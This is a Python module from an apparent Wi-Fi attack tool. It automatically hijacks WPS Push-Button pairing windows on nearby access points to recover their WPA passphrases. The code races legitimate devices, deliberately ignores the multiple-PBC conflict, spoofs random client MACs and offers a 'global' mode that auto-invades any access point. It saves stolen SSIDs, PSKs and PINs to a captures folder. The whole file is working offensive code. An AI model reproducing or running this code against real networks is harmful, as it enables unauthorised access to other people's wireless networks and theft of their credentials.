"""WpsPbcCapture — live orchestrator for opportunistic WPS Push-Button capture.

Given an AP in (or entering) its PBC walk window, associate as an Enrollee and
run the WpsEnrollee exchange to extract the PSK from M8. This is the active piece
the Scanner/Focus arming wires to; detection itself is passive
(``AccessPoint.wps_pbc_active``).

Overlap policy: we do NOT self-abort on MULTIPLE_PBC_DETECTED — we race to finish
first (the decision locked in the README). WpsEnrollee surfaces such a refusal as
PROTO_ERROR, and the caller simply retries on the next window.
"""

from __future__ import annotations

import enum
import logging
import re
import time
from pathlib import Path
from typing import Optional

from .association import WPS_REQ_ENROLLEE, WlanTransport, WpsAssociation, random_client_mac, str_to_mac
from .enrollee import WpsEnrollee
from .registrar import AttemptOutcome

logger = logging.getLogger(__name__)


class PbcArmMode(enum.Enum):
    """How aggressively the UI auto-invades detected PBC windows."""
    OFF = "off"            # detect + alert only; never TX
    SELECTED = "selected"  # auto-invade only the highlighted AP
    GLOBAL = "global"      # auto-invade any AP that opens a window

    def cycled(self) -> "PbcArmMode":
        order = (PbcArmMode.OFF, PbcArmMode.SELECTED, PbcArmMode.GLOBAL)
        return order[(order.index(self) + 1) % len(order)]


class PbcWatcher:
    """Edge-detects PBC walk windows opening across the live AP list.

    ``new_windows(aps)`` returns the APs whose ``wps_pbc_active`` just went
    False→True since the previous call, so callers act once per window rather
    than every poll tick. A window that closes and re-opens re-triggers.
    """

    def __init__(self):
        self._active: set = set()

    def new_windows(self, aps):
        current = {ap.bssid for ap in aps if getattr(ap, "wps_pbc_active", False)}
        opened = current - self._active
        self._active = current
        return [ap for ap in aps if ap.bssid in opened]


def save_pbc_credential(
    ssid: str, bssid: str, psk: str,
    *, captures_dir="captures", method: str = "WPS-PBC", pin: Optional[str] = None,
) -> Path:
    """Persist a recovered WPS PSK to captures/ (gitignored) so it survives exit.

    Same .wps format whether PSK came from PBC or PIN brute — both routes are
    just "WPS gave us the PSK." The ``method`` field discriminates; the optional
    ``pin`` is recorded too when known (PIN attack discloses it).
    """
    safe = re.sub(r"[^A-Za-z0-9_-]", "_", ssid or "hidden")[:32]
    path = Path(captures_dir) / f"{safe}_{bssid.replace(':', '-')}_{int(time.time())}.wps"
    path.parent.mkdir(parents=True, exist_ok=True)
    body = f"SSID: {ssid}\nBSSID: {bssid}\nPSK: {psk}\nmethod: {method}\n"
    if pin:
        body += f"PIN: {pin}\n"
    path.write_text(body)
    return path


class WpsPbcCapture:
    def __init__(self, iface, target, our_mac: Optional[bytes] = None, log=None,
                 tx_observer=None):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid.lower()
        self.channel = target.channel
        self.our_mac = our_mac or random_client_mac()
        self.log = log or logger.info
        self.tx_observer = tx_observer        # optional: record our TX (probe pcap)

    async def capture(self) -> AttemptOutcome:
        """One PBC enrollment attempt. Returns the WpsEnrollee outcome (SUCCESS
        carries the SSID + PSK)."""
        assoc = WpsAssociation(self.iface, self.bssid, self.target.ssid or "",
                               self.channel, our_mac=self.our_mac,
                               wps_request_type=WPS_REQ_ENROLLEE)
        assoc.start()
        transport = WlanTransport(self.iface, str_to_mac(self.bssid), self.our_mac,
                                  tx_observer=self.tx_observer)
        transport.start()
        try:
            if not await assoc.associate():
                self.log(f"assoc failed ({assoc.fail_reason}); running EAPOL anyway")
            outcome = await WpsEnrollee(transport, str_to_mac(self.bssid),
                                        self.our_mac, log=self.log).run()
        finally:
            transport.stop()
            assoc.stop()
        return outcome
